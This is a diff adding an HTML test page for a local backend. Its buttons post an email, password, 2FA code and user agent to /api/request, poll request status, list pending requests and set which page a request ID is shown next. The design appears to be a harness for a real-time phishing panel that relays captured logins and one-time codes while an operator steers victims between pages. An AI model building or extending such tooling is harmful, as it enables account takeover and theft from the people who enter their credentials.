@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Backend Connection</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .test-section {
+            margin: 20px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .success {
+            color: green;
+        }
+        .error {
+            color: red;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 5px;
+            border: none;
+            border-radius: 4px;
+            background: #4285f4;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #3367d6;
+        }
+        pre {
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>Test Backend Connection</h1>
+    
+    <div class="test-section">
+        <h2>1. Test API Request</h2>
+        <button onclick="testRequest()">Send Test Request</button>
+        <div id="requestResult"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>2. Test Status Check</h2>
+        <input type="number" id="requestId" placeholder="Enter Request ID">
+        <button onclick="testStatus()">Check Status</button>
+        <div id="statusResult"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>3. Test Update Page</h2>
+        <input type="number" id="updateId" placeholder="Enter Request ID">
+        <input type="text" id="pageName" placeholder="Enter Page Name" value="test.html">
+        <button onclick="testUpdatePage()">Update Page</button>
+        <div id="updateResult"></div>
+    </div>
+    
+    <div class="test-section">
+        <h2>4. Test Pending Requests</h2>
+        <button onclick="testPending()">Get Pending Requests</button>
+        <div id="pendingResult"></div>
+    </div>
+
+    <script>
+        const BACKEND_URL = 'http://localhost:5000';
+        
+        async function testRequest() {
+            const resultDiv = document.getElementById('requestResult');
+            resultDiv.innerHTML = 'Testing...';
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/request`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: 'test@example.com',
+                        password: 'testpassword',
+                        twofa: '123456',
+                        userAgent: navigator.userAgent,
+                        currentPage: 'test.html'
+                    })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    resultDiv.innerHTML = `<div class="success">✅ Success! Request ID: ${data.requestId}</div>
+                                         <pre>${JSON.stringify(data, null, 2)}</pre>`;
+                } else {
+                    resultDiv.innerHTML = `<div class="error">❌ Error: ${response.status} ${response.statusText}</div>`;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="error">❌ Connection Error: ${error.message}</div>`;
+            }
+        }
+        
+        async function testStatus() {
+            const requestId = document.getElementById('requestId').value;
+            const resultDiv = document.getElementById('statusResult');
+            
+            if (!requestId) {
+                resultDiv.innerHTML = '<div class="error">❌ Please enter a Request ID</div>';
+                return;
+            }
+            
+            resultDiv.innerHTML = 'Testing...';
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/status/${requestId}`);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    resultDiv.innerHTML = `<div class="success">✅ Success!</div>
+                                         <pre>${JSON.stringify(data, null, 2)}</pre>`;
+                } else {
+                    resultDiv.innerHTML = `<div class="error">❌ Error: ${response.status} ${response.statusText}</div>`;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="error">❌ Connection Error: ${error.message}</div>`;
+            }
+        }
+        
+        async function testUpdatePage() {
+            const requestId = document.getElementById('updateId').value;
+            const pageName = document.getElementById('pageName').value;
+            const resultDiv = document.getElementById('updateResult');
+            
+            if (!requestId || !pageName) {
+                resultDiv.innerHTML = '<div class="error">❌ Please enter both Request ID and Page Name</div>';
+                return;
+            }
+            
+            resultDiv.innerHTML = 'Testing...';
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/update-page`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        id: parseInt(requestId),
+                        currentPage: pageName
+                    })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    resultDiv.innerHTML = `<div class="success">✅ Success!</div>
+                                         <pre>${JSON.stringify(data, null, 2)}</pre>`;
+                } else {
+                    resultDiv.innerHTML = `<div class="error">❌ Error: ${response.status} ${response.statusText}</div>`;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="error">❌ Connection Error: ${error.message}</div>`;
+            }
+        }
+        
+        async function testPending() {
+            const resultDiv = document.getElementById('pendingResult');
+            resultDiv.innerHTML = 'Testing...';
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/pending`);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    resultDiv.innerHTML = `<div class="success">✅ Success! Found ${data.length} requests</div>
+                                         <pre>${JSON.stringify(data, null, 2)}</pre>`;
+                } else {
+                    resultDiv.innerHTML = `<div class="error">❌ Error: ${response.status} ${response.statusText}</div>`;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="error">❌ Connection Error: ${error.message}</div>`;
+            }
+        }
+    </script>
+</body>
+</html> 
